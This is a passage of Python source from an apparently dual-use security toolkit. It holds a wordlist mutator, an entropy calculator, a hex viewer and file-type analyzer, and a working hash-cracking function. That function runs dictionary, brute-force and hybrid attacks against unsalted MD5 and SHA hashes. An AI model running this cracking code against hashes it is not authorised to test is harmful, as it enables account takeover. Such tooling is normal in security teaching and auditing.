            cli_manager.console.print(f"[red]Found variations: {', '.join(found_variations)}[/red]")
            cli_manager.console.print(f"[red]This password is easily guessable.[/red]")
        else:
            print(f"\n⚠️  WARNING: Password variations found in common password list!")
            print(f"Found variations: {', '.join(found_variations)}")
            print(f"This password is easily guessable.")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[green]✓ Password not found in common password list.[/green]")
            cli_manager.console.print(f"[yellow]However, this doesn't guarantee it's secure.[/yellow]")
        else:
            print(f"\n✓ Password not found in common password list.")
            print(f"However, this doesn't guarantee it's secure.")


def wordlist_mutator():
    """Advanced wordlist mutation tool."""
    print("\n[Wordlist Mutator]")
    
    # Get input wordlist
    input_file = safe_file_input("Enter input wordlist file path: ")
    if not input_file:
        return
    
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Loaded {len(words)} words from wordlist[/green]")
        else:
            print(f"✓ Loaded {len(words)} words from wordlist")
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error loading wordlist: {e}[/red]")
        else:
            print(f"Error loading wordlist: {e}")
        return
    
    # Mutation options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Mutation Options:[/bold cyan]")
        cli_manager.console.print("1. [green]Prefix/Suffix[/green] - Add common prefixes/suffixes")
        cli_manager.console.print("2. [yellow]Leetspeak[/yellow] - Character substitutions")
        cli_manager.console.print("3. [blue]Case Variations[/blue] - Different case combinations")
        cli_manager.console.print("4. [red]Comprehensive[/red] - All mutation types")
    else:
        print("\nMutation Options:")
        print("1. Prefix/Suffix - Add common prefixes/suffixes")
        print("2. Leetspeak - Character substitutions")
        print("3. Case Variations - Different case combinations")
        print("4. Comprehensive - All mutation types")
    
    mutation_type = safe_input("Select mutation type (1-4): ")
    if not mutation_type:
        return
    
    # Generate mutations
    mutated_words = set(words)  # Start with original words
    
    if mutation_type in ["1", "4"]:  # Prefix/Suffix
        prefixes = ['admin', 'user', 'test', 'demo', 'temp', 'backup', 'old', 'new']
        suffixes = ['123', '1', '2023', '2024', '!', '@', '#', '$', '%', '^', '&', '*']
        
        for word in words:
            for prefix in prefixes:
                mutated_words.add(prefix + word)
                mutated_words.add(word + prefix)
            for suffix in suffixes:
                mutated_words.add(word + suffix)
                mutated_words.add(suffix + word)
    
    if mutation_type in ["2", "4"]:  # Leetspeak
        substitutions = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 
            's': ['$', '5'], 't': ['7'], 'l': ['1'], 'g': ['9']
        }
        
        for word in words:
            # Generate leetspeak variations
            for char, replacements in substitutions.items():
                if char in word.lower():
                    for replacement in replacements:
                        mutated_words.add(word.lower().replace(char, replacement))
                        mutated_words.add(word.upper().replace(char.upper(), replacement))
    
    if mutation_type in ["3", "4"]:  # Case Variations
        for word in words:
            mutated_words.add(word.lower())
            mutated_words.add(word.upper())
            mutated_words.add(word.capitalize())
            # Toggle case
            toggled = ''.join(c.upper() if c.islower() else c.lower() for c in word)
            mutated_words.add(toggled)
    
    # Save mutated wordlist
    output_file = safe_input("Enter output file path (default: mutated_wordlist.txt): ")
    if not output_file:
        output_file = "mutated_wordlist.txt"
    
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            for word in sorted(mutated_words):
                f.write(word + '\n')
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[green]✓ Generated {len(mutated_words)} mutated words[/green]")
            cli_manager.console.print(f"[green]✓ Saved to: {output_file}[/green]")
            cli_manager.console.print(f"[cyan]Original words: {len(words)}[/cyan]")
            cli_manager.console.print(f"[cyan]New variations: {len(mutated_words) - len(words)}[/cyan]")
        else:
            print(f"\n✓ Generated {len(mutated_words)} mutated words")
            print(f"✓ Saved to: {output_file}")
            print(f"Original words: {len(words)}")
            print(f"New variations: {len(mutated_words) - len(words)}")
        
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error saving wordlist: {e}[/red]")
        else:
            print(f"Error saving wordlist: {e}")


def entropy_calculator():
    """Standalone entropy calculator."""
    print("\n[Entropy Calculator]")
    
    while True:
        password = safe_input("Enter password to calculate entropy (or 'quit' to exit): ")
        if not password or password.lower() == 'quit':
            break
        
        entropy = calculate_entropy(password)
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]Entropy Analysis:[/bold green]")
            cli_manager.console.print(f"Password: [cyan]{password}[/cyan]")
            cli_manager.console.print(f"Entropy: [green]{entropy:.1f} bits[/green]")
            
            # Entropy strength assessment
            if entropy >= 128:
                strength = "Excellent"
                color = "green"
            elif entropy >= 64:
                strength = "Very Strong"
                color = "green"
            elif entropy >= 32:
                strength = "Strong"
                color = "yellow"
            elif entropy >= 16:
                strength = "Good"
                color = "yellow"
            elif entropy >= 8:
                strength = "Fair"
                color = "red"
            else:
                strength = "Very Weak"
                color = "red"
            
            cli_manager.console.print(f"Strength: [{color}]{strength}[/{color}]")
            
            # Time to crack estimation (rough)
            if entropy >= 64:
                time_estimate = "Centuries"
            elif entropy >= 32:
                time_estimate = "Years"
            elif entropy >= 16:
                time_estimate = "Days to months"
            else:
                time_estimate = "Minutes to hours"
            
            cli_manager.console.print(f"Estimated crack time: [yellow]{time_estimate}[/yellow]")
            
        else:
            print(f"\nEntropy Analysis:")
            print(f"Password: {password}")
            print(f"Entropy: {entropy:.1f} bits")
            
            # Simple strength assessment
            if entropy >= 64:
                strength = "Very Strong"
            elif entropy >= 32:
                strength = "Strong"
            elif entropy >= 16:
                strength = "Good"
            else:
                strength = "Weak"
            
            print(f"Strength: {strength}")


def brute_force_attack():
    """Brute-force attack against hashed passwords."""
    print("\n[Brute-Force Attack]")
    print("⚠️  WARNING: This tool is for educational purposes and local testing only.")
    print("Do not use against systems or accounts without explicit permission.")
    
    # Get target hash
    target_hash = safe_input("Enter target hash: ")
    if not target_hash:
        return
    
    target_hash = target_hash.strip().lower()
    
    # Determine hash type
    hash_type = None
    if len(target_hash) == 32:
        hash_type = "md5"
    elif len(target_hash) == 40:
        hash_type = "sha1"
    elif len(target_hash) == 64:
        hash_type = "sha256"
    elif len(target_hash) == 128:
        hash_type = "sha512"
    else:
        print("Unsupported hash type. Supported: MD5, SHA1, SHA256, SHA512")
        return
    
    print(f"Detected hash type: {hash_type.upper()}")
    
    # Attack mode selection
    print("\nAttack Modes:")
    print("1. Dictionary Attack (from wordlist)")
    print("2. Brute Force (character combinations)")
    print("3. Hybrid Attack (dictionary + numbers)")
    
    mode_choice = safe_input("Select attack mode: ")
    if not mode_choice:
        return
    
    if mode_choice == "1":  # Dictionary Attack
        wordlist_path = safe_file_input("Enter wordlist file path: ")
        if not wordlist_path:
            return
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            
            print(f"Loaded {len(words)} words from wordlist")
            print("Starting dictionary attack...")
            
            attempts = 0
            for word in words:
                attempts += 1
                if attempts % 1000 == 0:
                    print(f"Tried {attempts} passwords...")
                
                # Hash the word
                if hash_type == "md5":
                    hashed = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == "sha1":
                    hashed = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == "sha256":
                    hashed = hashlib.sha256(word.encode()).hexdigest()
                elif hash_type == "sha512":
                    hashed = hashlib.sha512(word.encode()).hexdigest()
                
                if hashed == target_hash:
                    print(f"\n🎉 PASSWORD FOUND!")
                    print(f"Password: {word}")
                    print(f"Hash: {hashed}")
                    print(f"Attempts: {attempts}")
                    return
            
            print(f"\n❌ Password not found after {attempts} attempts")
            
        except Exception as e:
            print(f"Error reading wordlist: {e}")
    
    elif mode_choice == "2":  # Brute Force
        print("\nBrute Force Options:")
        print("1. Numbers only (0-9)")
        print("2. Lowercase letters (a-z)")
        print("3. Uppercase letters (A-Z)")
        print("4. Alphanumeric (a-z, A-Z, 0-9)")
        print("5. Full character set (a-z, A-Z, 0-9, special)")
        
        charset_choice = safe_input("Select character set: ")
        if not charset_choice:
            return
        
        # Define character sets
        charsets = {
            "1": string.digits,
            "2": string.ascii_lowercase,
            "3": string.ascii_uppercase,
            "4": string.ascii_letters + string.digits,
            "5": string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        }
        
        if charset_choice not in charsets:
            print("Invalid choice.")
            return
        
        charset = charsets[charset_choice]
        
        max_length_input = safe_input("Enter maximum password length (1-8, default 6): ")
        if not max_length_input:
            max_length = 6
        else:
            try:
                max_length = int(max_length_input)
                if not (1 <= max_length <= 8):
                    print("Length must be between 1 and 8 for brute force.")
                    return
            except ValueError:
                print("Invalid length.")
                return
        
        print(f"Starting brute force attack with charset: {charset[:20]}{'...' if len(charset) > 20 else ''}")
        print(f"Maximum length: {max_length}")
        print("This may take a while...")
        
        attempts = 0
        for length in range(1, max_length + 1):
            print(f"Trying length {length}...")
            for guess in itertools.product(charset, repeat=length):
                attempts += 1
                if attempts % 10000 == 0:
                    print(f"Tried {attempts} passwords...")
                
                password = ''.join(guess)
                
                # Hash the password
                if hash_type == "md5":
                    hashed = hashlib.md5(password.encode()).hexdigest()
                elif hash_type == "sha1":
                    hashed = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type == "sha256":
                    hashed = hashlib.sha256(password.encode()).hexdigest()
                elif hash_type == "sha512":
                    hashed = hashlib.sha512(password.encode()).hexdigest()
                
                if hashed == target_hash:
                    print(f"\n🎉 PASSWORD FOUND!")
                    print(f"Password: {password}")
                    print(f"Hash: {hashed}")
                    print(f"Attempts: {attempts}")
                    return
        
        print(f"\n❌ Password not found after {attempts} attempts")
    
    elif mode_choice == "3":  # Hybrid Attack
        wordlist_path = safe_file_input("Enter wordlist file path: ")
        if not wordlist_path:
            return
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            
            print(f"Loaded {len(words)} words from wordlist")
            print("Starting hybrid attack (words + numbers)...")
            
            attempts = 0
            for word in words:
                # Try original word
                attempts += 1
                if attempts % 1000 == 0:
                    print(f"Tried {attempts} passwords...")
                
                # Hash the word
                if hash_type == "md5":
                    hashed = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == "sha1":
                    hashed = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == "sha256":
                    hashed = hashlib.sha256(word.encode()).hexdigest()
                elif hash_type == "sha512":
                    hashed = hashlib.sha512(word.encode()).hexdigest()
                
                if hashed == target_hash:
                    print(f"\n🎉 PASSWORD FOUND!")
                    print(f"Password: {word}")
                    print(f"Hash: {hashed}")
                    print(f"Attempts: {attempts}")
                    return
                
                # Try word + numbers (0-999)
                for num in range(1000):
                    attempts += 1
                    if attempts % 1000 == 0:
                        print(f"Tried {attempts} passwords...")
                    
                    hybrid_password = f"{word}{num}"
                    
                    # Hash the hybrid password
                    if hash_type == "md5":
                        hashed = hashlib.md5(hybrid_password.encode()).hexdigest()
                    elif hash_type == "sha1":
                        hashed = hashlib.sha1(hybrid_password.encode()).hexdigest()
                    elif hash_type == "sha256":
                        hashed = hashlib.sha256(hybrid_password.encode()).hexdigest()
                    elif hash_type == "sha512":
                        hashed = hashlib.sha512(hybrid_password.encode()).hexdigest()
                    
                    if hashed == target_hash:
                        print(f"\n🎉 PASSWORD FOUND!")
                        print(f"Password: {hybrid_password}")
                        print(f"Hash: {hashed}")
                        print(f"Attempts: {attempts}")
                        return
            
            print(f"\n❌ Password not found after {attempts} attempts")
            
        except Exception as e:
            print(f"Error reading wordlist: {e}")
    
    else:
        print("Invalid attack mode.")


def file_analyzer():
    """Enhanced file analysis tools with advanced binary analysis and forensic capabilities."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced File Analyzer[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced File Analyzer]")
    
    file_path = safe_file_input("Enter file path: ")
    if not file_path:
        return
    
    while True:
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Analysis Options:[/bold cyan]")
            console.print("1. [green]Hex Viewer[/green] - Binary data visualization")
            console.print("2. [green]String Extractor[/green] - Extract readable strings")
            console.print("3. [green]File Type Detection[/green] - Advanced signature analysis")
            console.print("4. [green]Entropy Analysis[/green] - Data randomness analysis")
            console.print("5. [green]Compression Detection[/green] - Identify compression algorithms")
            console.print("6. [green]Binary Pattern Analysis[/green] - Search for patterns")
            console.print("7. [green]File Structure Analysis[/green] - Analyze file layout")
            console.print("8. [green]Comprehensive Report[/green] - Full file analysis")
            console.print("0. [red]Back to main menu[/red]")
        else:
            print("\nAnalysis Options:")
            print("1. Hex Viewer - Binary data visualization")
            print("2. String Extractor - Extract readable strings")
            print("3. File Type Detection - Advanced signature analysis")
            print("4. Entropy Analysis - Data randomness analysis")
            print("5. Compression Detection - Identify compression algorithms")
            print("6. Binary Pattern Analysis - Search for patterns")
            print("7. File Structure Analysis - Analyze file layout")
            print("8. Comprehensive Report - Full file analysis")
            print("0. Back to main menu")
        
        choice = safe_input("Select analysis: ")
        if not choice:
            return
        
        if choice == "0":
            return
        
        elif choice == "1":  # Enhanced Hex Viewer
            enhanced_hex_viewer(file_path)
        
        elif choice == "2":  # Enhanced String Extractor
            enhanced_string_extractor(file_path)
        
        elif choice == "3":  # Enhanced File Type Detection
            enhanced_file_type_detection(file_path)
        
        elif choice == "4":  # Enhanced Entropy Analysis
            enhanced_entropy_analysis(file_path)
        
        elif choice == "5":  # Compression Detection
            compression_detection(file_path)
        
        elif choice == "6":  # Binary Pattern Analysis
            binary_pattern_analysis(file_path)
        
        elif choice == "7":  # File Structure Analysis
            file_structure_analysis(file_path)
        
        elif choice == "8":  # Comprehensive Report
            comprehensive_file_report(file_path)
        
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print("Invalid option. Please try again.")


def enhanced_hex_viewer(file_path):
    """Enhanced hex viewer with better formatting and navigation."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Hex Viewer[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced Hex Viewer]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        if RICH_AVAILABLE:
            console.print(f"File: {os.path.basename(file_path)} ({file_size:,} bytes)")
        else:
            print(f"File: {os.path.basename(file_path)} ({file_size:,} bytes)")
        
        # Get display size from user
        display_size = safe_input("Bytes to display (default 512): ")
        try:
            display_size = int(display_size) if display_size else 512
        except ValueError:
            display_size = 512
        
        display_size = min(display_size, file_size)
        
        if RICH_AVAILABLE:
            # Create hex view table
            table = Table(title=f"Hex View - {os.path.basename(file_path)}")
            table.add_column("Offset", style="cyan", no_wrap=True)
            table.add_column("Hex Values", style="green", no_wrap=True)
            table.add_column("ASCII", style="yellow", no_wrap=True)
            
            for i in range(0, display_size, 16):
                chunk = data[i:i+16]
                offset = f"{i:08x}"
                
                # Hex values
                hex_values = ' '.join(f'{b:02x}' for b in chunk)
                hex_values = hex_values.ljust(47)
                
                # ASCII representation
                ascii_values = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
                
                table.add_row(offset, hex_values, ascii_values)
            
            console.print(table)
            
            if file_size > display_size:
                console.print(f"[yellow]... showing first {display_size:,} bytes of {file_size:,} total[/yellow]")
        else:
            print(f"\nHex View of {os.path.basename(file_path)}:")
            print("=" * 80)
            
            for i in range(0, display_size, 16):
                chunk = data[i:i+16]
                offset = f"{i:08x}"
                
                # Hex values
                hex_values = ' '.join(f'{b:02x}' for b in chunk)
                hex_values = hex_values.ljust(47)
                
                # ASCII representation
                ascii_values = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
                
                print(f"{offset}: {hex_values} |{ascii_values}|")
            
            if file_size > display_size:
                print(f"... (showing first {display_size:,} bytes of {file_size:,} total)")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error reading file: {e}[/red]")
        else:
            print(f"Error reading file: {e}")


def enhanced_string_extractor(file_path):
    """Enhanced string extractor with multiple encoding support."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced String Extractor[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced String Extractor]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        if RICH_AVAILABLE:
            console.print(f"File: {os.path.basename(file_path)} ({len(data):,} bytes)")
        else:
            print(f"File: {os.path.basename(file_path)} ({len(data):,} bytes)")
        
        # Get minimum string length
        min_length = safe_input("Minimum string length (default 4): ")
        try:
            min_length = int(min_length) if min_length else 4
        except ValueError:
            min_length = 4
        
        # Extract strings with different encodings
        encodings = ['ascii', 'utf-8', 'utf-16', 'latin-1']
        all_strings = []
        
        for encoding in encodings:
            try:
                strings = extract_strings_from_data(data, min_length, encoding)
                all_strings.extend([(s, encoding) for s in strings])
            except:
                continue
        
        # Remove duplicates while preserving encoding info
        unique_strings = []
        seen = set()
        for string, encoding in all_strings:
            if string not in seen:
                unique_strings.append((string, encoding))
                seen.add(string)
        
        # Sort by length (longest first)
        unique_strings.sort(key=lambda x: len(x[0]), reverse=True)
        
        if RICH_AVAILABLE:
            if unique_strings:
                table = Table(title=f"Extracted Strings - {os.path.basename(file_path)}")
                table.add_column("#", style="cyan", justify="right")
                table.add_column("String", style="green")
                table.add_column("Length", style="yellow", justify="right")
                table.add_column("Encoding", style="magenta")
                
                for i, (string, encoding) in enumerate(unique_strings[:100], 1):  # Limit to 100
                    # Truncate long strings
                    display_string = string[:50] + "..." if len(string) > 50 else string
                    table.add_row(str(i), display_string, str(len(string)), encoding)
                
                console.print(table)
                
                if len(unique_strings) > 100:
                    console.print(f"[yellow]... showing first 100 of {len(unique_strings)} strings[/yellow]")
            else:
                console.print("[yellow]No strings found with the specified criteria.[/yellow]")
        else:
            if unique_strings:
                print(f"\nExtracted strings from {os.path.basename(file_path)}:")
                print("=" * 80)
                for i, (string, encoding) in enumerate(unique_strings[:100], 1):  # Limit to 100
                    # Truncate long strings
                    display_string = string[:50] + "..." if len(string) > 50 else string
                    print(f"{i:3}. [{encoding:8}] {display_string}")
                
                if len(unique_strings) > 100:
                    print(f"... (showing first 100 of {len(unique_strings)} strings)")
            else:
                print("No strings found with the specified criteria.")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error extracting strings: {e}[/red]")
        else:
            print(f"Error extracting strings: {e}")


def extract_strings_from_data(data, min_length, encoding):
    """Extract strings from binary data with specified encoding."""
    strings = []
    current_string = ""
    
    try:
        if encoding == 'utf-16':
            # Handle UTF-16 with BOM
            if data.startswith(b'\xff\xfe'):  # Little endian
                text = data[2:].decode('utf-16le', errors='ignore')
            elif data.startswith(b'\xfe\xff'):  # Big endian
                text = data[2:].decode('utf-16be', errors='ignore')
            else:
                text = data.decode('utf-16le', errors='ignore')
        else:
            text = data.decode(encoding, errors='ignore')
        
        for char in text:
            if char.isprintable() and char not in '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f':
                current_string += char
            else:
                if len(current_string) >= min_length:
                    strings.append(current_string)
                current_string = ""
        
        # Add any remaining string
        if len(current_string) >= min_length:
            strings.append(current_string)
    
    except:
        # Fallback to byte-by-byte analysis
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                current_string += chr(byte)
            else:
                if len(current_string) >= min_length:
                    strings.append(current_string)
                current_string = ""
        
        # Add any remaining string
        if len(current_string) >= min_length:
            strings.append(current_string)
    
    return strings


def enhanced_file_type_detection(file_path):
    """Enhanced file type detection with comprehensive signature database."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced File Type Detection[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced File Type Detection]")
    
    try:
        with open(file_path, 'rb') as f:
            header = f.read(64)  # Read more bytes for better detection
            f.seek(-64, 2)  # Go to end of file
            footer = f.read(64)
        
        file_size = os.path.getsize(file_path)
        
        # Comprehensive file signatures
        signatures = {
            # Images
            b'\xff\xd8\xff': 'JPEG Image',
            b'\x89PNG\r\n\x1a\n': 'PNG Image',
            b'GIF8': 'GIF Image',
            b'BM': 'BMP Image',
            b'RIFF': 'RIFF Container (WAV, AVI, etc.)',
            b'\x00\x00\x01\x00': 'ICO Icon',
            b'\x00\x00\x02\x00': 'ICO Icon',
            b'II*\x00': 'TIFF Image (Little Endian)',
            b'MM\x00*': 'TIFF Image (Big Endian)',
            b'8BPS': 'Photoshop Document',
            
            # Documents
            b'%PDF': 'PDF Document',
            b'PK\x03\x04': 'ZIP Archive',
            b'PK\x05\x06': 'ZIP Archive (empty)',
            b'PK\x07\x08': 'ZIP Archive (spanned)',
            b'\x50\x4b\x03\x04': 'ZIP Archive',
            b'\x50\x4b\x05\x06': 'ZIP Archive (empty)',
            b'\x50\x4b\x07\x08': 'ZIP Archive (spanned)',
            b'\x1f\x8b': 'GZIP Archive',
            b'\x37\x7A\xBC\xAF': '7-Zip Archive',
            b'Rar!': 'RAR Archive',
            b'\x50\x4b\x03\x04\x14\x00\x06\x00': 'DOCX/XLSX/PPTX (Office 2007+)',
            b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1': 'DOC/XLS/PPT (Office 97-2003)',
            
            # Executables
            b'\x7fELF': 'ELF Executable',
            b'MZ': 'Windows Executable',
            b'\xfe\xed\xfa': 'Mach-O Executable',
            b'\xca\xfe\xba\xbe': 'Java Class File',
            b'\x50\x45\x00\x00': 'Windows PE Executable',
            b'\x4d\x5a': 'Windows Executable',
            
            # Scripts and Text
            b'#!/': 'Shell Script',
            b'<?xml': 'XML Document',
            b'<!DOCTYPE': 'HTML Document',
            b'<html': 'HTML Document',
            b'<?php': 'PHP Script',
            b'#!python': 'Python Script',
            b'#!perl': 'Perl Script',
            b'#!ruby': 'Ruby Script',
            
            # Audio/Video
            b'ID3': 'MP3 Audio',
            b'\xff\xfb': 'MP3 Audio',
            b'\xff\xf3': 'MP3 Audio',
            b'\xff\xf2': 'MP3 Audio',
            b'ftyp': 'MP4 Video',
            b'AVI ': 'AVI Video',
            b'FLV\x01': 'Flash Video',
            
            # Databases
            b'SQLite format 3': 'SQLite Database',
            b'\x00\x01\x00\x00': 'Microsoft Access Database',
            
            # Virtual Machines
            b'KDMV': 'VMware Disk',
            b'conectix': 'Virtual PC Disk',
            b'vhdxfile': 'Hyper-V Disk',
            
            # Archives
            b'\x1f\x9d': 'Compressed File (compress)',
            b'\x1f\xa0': 'Compressed File (compress)',
            b'BZh': 'BZIP2 Archive',
            b'\x28\xb5\x2f\xfd': 'Zstandard Archive',
            
            # Network
            b'\x00\x00\x00\x0c': 'Java Serialized Object',
            b'\xac\xed': 'Java Serialized Object',
        }
        
        detected_types = []
        
        # Check header signatures
        for signature, file_type in signatures.items():
            if header.startswith(signature):
                detected_types.append((file_type, "Header signature"))
        
        # Check footer signatures
        for signature, file_type in signatures.items():
            if footer.endswith(signature):
                detected_types.append((file_type, "Footer signature"))
        
        # Additional analysis
        if not detected_types:
            # Check for text files
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    sample = f.read(1000)
                    if sample.isprintable():
                        detected_types.append(("Text File", "Content analysis"))
            except:
                pass
        
        # Display results
        if RICH_AVAILABLE:
            table = Table(title=f"File Type Analysis - {os.path.basename(file_path)}")
            table.add_column("Property", style="cyan", no_wrap=True)
            table.add_column("Value", style="green")
            
            table.add_row("File Size", f"{file_size:,} bytes")
            table.add_row("Header (hex)", ' '.join(f'{b:02x}' for b in header[:16]))
            
            if detected_types:
                for file_type, method in detected_types:
                    table.add_row("Detected Type", f"{file_type} ({method})")
            else:
                table.add_row("Detected Type", "Unknown/Text")
            
            console.print(table)
        else:
            print(f"\nFile Type Analysis for {os.path.basename(file_path)}:")
            print("=" * 60)
            print(f"File Size: {file_size:,} bytes")
            print(f"Header (hex): {' '.join(f'{b:02x}' for b in header[:16])}")
            
            if detected_types:
                for file_type, method in detected_types:
                    print(f"Detected Type: {file_type} ({method})")
            else:
                print("Detected Type: Unknown/Text")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error analyzing file type: {e}[/red]")
        else:
            print(f"Error analyzing file type: {e}")


def enhanced_entropy_analysis(file_path):
    """Enhanced entropy analysis with detailed statistical information."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Entropy Analysis[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced Entropy Analysis]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        entropy = calculate_entropy(data)
        is_encrypted = is_likely_encrypted(data)
        
        # Byte frequency analysis
        byte_counts = {}
        for byte in data:
            byte_counts[byte] = byte_counts.get(byte, 0) + 1
        
        # Calculate additional statistics
        unique_bytes = len(byte_counts)
        most_common_byte = max(byte_counts, key=byte_counts.get)
        most_common_count = byte_counts[most_common_byte]
        least_common_byte = min(byte_counts, key=byte_counts.get)
        least_common_count = byte_counts[least_common_byte]
        
        # Calculate byte distribution
        byte_distribution = {}
        for byte in range(256):
            count = byte_counts.get(byte, 0)
            percentage = (count / file_size) * 100
            if percentage > 0.1:  # Only show bytes with >0.1% frequency
                byte_distribution[byte] = percentage
        
        # Sort by frequency
        sorted_distribution = sorted(byte_distribution.items(), key=lambda x: x[1], reverse=True)
        
        if RICH_AVAILABLE:
            # Create analysis table
            table = Table(title=f"Entropy Analysis - {os.path.basename(file_path)}")
            table.add_column("Property", style="cyan", no_wrap=True)
            table.add_column("Value", style="green")
            
            table.add_row("File Size", f"{file_size:,} bytes")
            table.add_row("Entropy", f"{entropy:.4f} bits/byte")
            table.add_row("Unique Bytes", str(unique_bytes))
            table.add_row("Most Common Byte", f"0x{most_common_byte:02x} ({most_common_count:,} times, {most_common_count/file_size*100:.2f}%)")
            table.add_row("Least Common Byte", f"0x{least_common_byte:02x} ({least_common_count:,} times, {least_common_count/file_size*100:.2f}%)")
            
            # Entropy interpretation
            if entropy < 4.0:
                interpretation = "Low (likely text or structured data)"
            elif entropy < 6.0:
                interpretation = "Medium (mixed content)"
            elif entropy < 7.5:
                interpretation = "High (compressed or encoded data)"
            else:
                interpretation = "Very High (likely encrypted or random)"
            
            table.add_row("Entropy Level", interpretation)
            table.add_row("Likely Encrypted/Compressed", "Yes" if is_encrypted else "No")
            
            console.print(table)
            
            # Show byte distribution
            if sorted_distribution:
                console.print("\n[bold cyan]Byte Distribution (Top 10):[/bold cyan]")
                dist_table = Table()
                dist_table.add_column("Byte", style="cyan", justify="right")
                dist_table.add_column("Frequency", style="green", justify="right")
                dist_table.add_column("Percentage", style="yellow", justify="right")
                
                for byte, percentage in sorted_distribution[:10]:
                    dist_table.add_row(f"0x{byte:02x}", f"{byte_counts[byte]:,}", f"{percentage:.2f}%")
                
                console.print(dist_table)
        else:
            print(f"\nEntropy Analysis for {os.path.basename(file_path)}:")
            print("=" * 60)
            print(f"File Size: {file_size:,} bytes")
            print(f"Entropy: {entropy:.4f} bits/byte")
            print(f"Unique bytes: {unique_bytes}")
            print(f"Most common byte: 0x{most_common_byte:02x} ({most_common_count:,} times, {most_common_count/file_size*100:.2f}%)")
            print(f"Least common byte: 0x{least_common_byte:02x} ({least_common_count:,} times, {least_common_count/file_size*100:.2f}%)")
            
            # Entropy interpretation
            if entropy < 4.0:
                print("Entropy Level: Low (likely text or structured data)")
            elif entropy < 6.0:
                print("Entropy Level: Medium (mixed content)")
            elif entropy < 7.5:
                print("Entropy Level: High (compressed or encoded data)")
            else:
                print("Entropy Level: Very High (likely encrypted or random)")
            
            print(f"Likely Encrypted/Compressed: {'Yes' if is_encrypted else 'No'}")
            
            # Show byte distribution
            if sorted_distribution:
                print(f"\nByte Distribution (Top 10):")
                for byte, percentage in sorted_distribution[:10]:
                    print(f"  0x{byte:02x}: {byte_counts[byte]:,} times ({percentage:.2f}%)")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error analyzing entropy: {e}[/red]")
        else:
            print(f"Error analyzing entropy: {e}")


def compression_detection(file_path):
    """Detect compression algorithms and analyze compression characteristics."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Compression Detection[/bold blue]", border_style="blue"))
    else:
        print("\n[Compression Detection]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        entropy = calculate_entropy(data)
        
        # Compression signatures
        compression_signatures = {
            b'\x1f\x8b': "GZIP",
            b'PK\x03\x04': "ZIP",
            b'PK\x05\x06': "ZIP (empty)",
            b'PK\x07\x08': "ZIP (spanned)",
            b'\x50\x4b\x03\x04': "ZIP",
            b'\x50\x4b\x05\x06': "ZIP (empty)",
            b'\x50\x4b\x07\x08': "ZIP (spanned)",
            b'BZh': "BZIP2",
            b'\x28\xb5\x2f\xfd': "Zstandard",
            b'\x37\x7A\xBC\xAF': "7-Zip",
            b'Rar!': "RAR",
            b'\x1f\x9d': "Compress",
            b'\x1f\xa0': "Compress",
            b'\x00\x00\x00\x00\x00\x00\x00\x00': "Null compression",
        }
        
        detected_compression = []
        
        # Check for compression signatures
        for signature, comp_type in compression_signatures.items():
            if data.startswith(signature):
                detected_compression.append((comp_type, "Header signature"))
        
        # Analyze compression characteristics
        compression_indicators = []
        
        # High entropy (>7.0) often indicates compression
        if entropy > 7.0:
            compression_indicators.append(f"High entropy ({entropy:.2f}) suggests compression")
        
        # Check for repeated patterns (low compression)
